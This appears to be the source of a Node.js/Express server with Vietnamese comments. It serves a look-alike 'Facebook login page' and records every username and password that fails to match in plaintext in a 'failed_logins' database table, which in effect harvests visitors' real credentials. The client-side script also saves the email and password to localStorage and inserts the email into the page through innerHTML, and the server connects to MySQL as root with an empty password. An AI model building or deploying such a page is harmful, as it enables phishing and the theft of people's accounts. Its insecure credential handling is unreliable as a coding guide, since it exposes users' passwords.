const express = require('express');
const mysql = require('mysql');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Cấu hình body-parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Cấu hình thư mục public
app.use(express.static(path.join(__dirname, 'Facebook login page')));

// Kết nối đến cơ sở dữ liệu MySQL
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'fb'
});

db.connect((err) => {
  if (err) throw err;
  console.log('Connected to database');
});

// Cấu hình routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'Facebook login page', 'facelogin.html'));
});

// Hàm lưu thông tin đăng nhập không thành công
function logFailedLogin(username, password) {
  const queryInsertFailedLogin = 'INSERT INTO failed_logins (username, password) VALUES (?, ?)';
  db.query(queryInsertFailedLogin, [username, password], (err, result) => {
    if (err) throw err;
    console.log('Failed login recorded');
  });
}

// Hàm xử lý đăng nhập
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Kiểm tra xem tài khoản có tồn tại không
  const queryCheckUser = 'SELECT * FROM users WHERE username = ?';

  db.query(queryCheckUser, [username], (err, results) => {
    if (err) throw err;

    if (results.length > 0) {
      // Nếu tài khoản tồn tại, kiểm tra mật khẩu
      const user = results[0];

      if (user.password === password) {
        res.send('Login successful');
      } else {
        res.send('Password is incorrect');
        // Lưu lại tài khoản và mật khẩu không khớp
        logFailedLogin(username, password);
      }
    } else {
      // Nếu tài khoản không tồn tại
      res.send('Username does not exist');
      // Lưu lại tài khoản và mật khẩu không khớp
      logFailedLogin(username, password);
    }
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});

function toggleSubmit() {
  let email, psw;
  email = document.getElementById("email").value;
  psw = document.getElementById("psw").value;

  let logValue = {
    email: email,
    psw: psw,
  };
  logValue = JSON.stringify(logValue);
  localStorage.setItem("LogIn-Data", logValue);

  body.innerHTML = `<h1>Welcome, ${email}.</h1>`;


}



function toggleDark() {
  let btnDark = document.getElementById('btnDark');
  let body = document.getElementById('body');
  let form = document.getElementById('form');
  let box = document.getElementById('box');
  let link = document.getElementById('link');

  body.classList.toggle('dark');
  form.classList.toggle('formDark');
  box.classList.toggle('boxDark');
  link.classList.toggle('linkDark');

  const saveLocal = localStorage.setItem('dark', 'on')
  const saveDark = localStorage.getItem('dark')
  // if(saveLocal==)
}